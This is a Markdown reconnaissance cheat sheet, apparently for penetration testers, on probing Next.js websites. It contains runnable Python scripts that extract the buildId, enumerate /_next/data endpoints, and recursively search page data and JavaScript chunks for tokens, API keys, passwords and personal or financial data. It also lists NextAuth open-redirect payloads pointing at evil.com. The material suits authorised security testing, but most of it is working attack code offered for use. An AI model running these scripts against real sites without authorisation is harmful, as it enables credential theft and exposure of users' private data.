# Next.js Reconnaissance Techniques

When target uses Next.js (detectable via `X-Powered-By: Next.js` header or `_next/static/` paths).

## Detection
```bash
curl -sI https://target.com | grep -i "x-powered-by"
# X-Powered-By: Next.js
```

## 1. buildId Extraction
The `__NEXT_DATA__` script tag in page source contains the `buildId`. This is the key to all SSG data.

```python
import re, json, requests
r = requests.get('https://target.com/', headers={'User-Agent': 'Mozilla/5.0'})
match = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', r.text)
if match:
    data = json.loads(match.group(1))
    build_id = data['buildId']
    print(f"buildId: {build_id}")
```

## 2. SSG Data Fetching (buildId Abuse)
With the buildId, ALL server-side generated data is accessible via predictable JSON endpoints:
```
/_next/data/{buildId}/<page>.json
```

Test common pages:
```python
pages = ['/', 'login', 'register', 'admin', 'dashboard', 'api/auth/session',
         'myxl', 'profile', 'settings', 'account', 'products', 'promo']
for page in pages:
    r = requests.get(f'https://target.com/_next/data/{build_id}/{page}.json')
    if r.status_code == 200:
        data = r.json()
        keys = list(data.get('props', {}).get('pageProps', {}).keys())
        print(f"✅ /{page}.json -> {keys}")
```

**What to look for in pageProps:**
- `token`, `apiKey`, `secret` — credential leaks
- `userId`, `email`, `phone`, `msisdn` — PII
- `balance`, `transactions` — financial data
- Internal config (`baseUrl`, `apiUrl`, `authUrl`)

## 3. __NEXT_DATA__ Full Analysis
```python
data = json.loads(match.group(1))
print(f"Top keys: {list(data.keys())}")
print(f"page: {data.get('page')}")
print(f"buildId: {data.get('buildId')}")
print(f"locale: {data.get('locale')}")
print(f"locales: {data.get('locales')}")

# Deep search for sensitive keys
def find_sensitive(obj, path=''):
    sensitive = ['token', 'apiKey', 'secret', 'password', 'authToken',
                 'accessToken', 'refreshToken', 'sessionId', 'credential',
                 'databaseUrl', 'projectId', 'clientId']
    if isinstance(obj, dict):
        for k, v in obj.items():
            if any(s in k.lower() for s in sensitive):
                print(f"🔴 {path}.{k} = {str(v)[:80]}")
            find_sensitive(v, f"{path}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            find_sensitive(v, f"{path}[{i}]")

find_sensitive(data)
```

## 4. JavaScript Chunk Analysis
Next.js bundles all JS into chunks under `/_next/static/chunks/`. These often contain:
- Hardcoded API endpoints
- Internal backend URLs
- Feature flags
- Environment-specific config

```python
import re
js_files = re.findall(r'(/_next/static/chunks/[^"\']+\.js)', r.text)
api_urls = set()
for js_path in js_files[:10]:
    r2 = requests.get(f'https://target.com{js_path}')
    if r2.status_code == 200:
        # Find API endpoints
        apis = re.findall(r'["\']/(api|graphql|auth|v[12])/[^"\']+', r2.text)
        api_urls.update(apis)
        # Find internal URLs
        urls = re.findall(r'https?://[a-zA-Z0-9._-]+\.[a-z]{2,}[^"\']*', r2.text)
        for u in urls:
            if 'target' in u or 'internal' in u:
                api_urls.add(u)
        # Find potential secrets
        keys = re.findall(r'["\']([a-zA-Z0-9_]{20,})["\']', r2.text)
```

## 5. NextAuth.js Checks (if present)
Next.js apps often use NextAuth.js for auth. Check for:
```
/api/auth/session
/api/auth/providers
/api/auth/csrf
/api/auth/signin
/api/auth/signout
/api/auth/callback/{provider}
```

Open redirect via callback:
```
/api/auth/callback/credentials?callbackUrl=https://evil.com
/api/auth/signin?callbackUrl=https://evil.com
/api/auth/signin?callbackUrl=//evil.com
/api/auth/signin?callbackUrl=/\evil.com
```

## 6. ISR/SSG Cache Headers
Next.js ISR (Incremental Static Regeneration) responses have specific cache headers:
```
x-nextjs-page: /<page>
x-nextjs-prerender: 1
Cache-Control: s-maxage=60, stale-while-revalidate=31535940
```

The `stale-while-revalidate` value reveals the revalidation window.

## Pitfalls
- buildId changes on each deployment — re-extract if getting 404s
- Some pages require auth — 401/403 on `/_next/data/` means auth-gated
- `__NEXT_DATA__` in SSG pages is public; in SSR pages it may be minimal
- Cloudflare may cache `_next/data/` responses — check `CF-Cache-Status` header
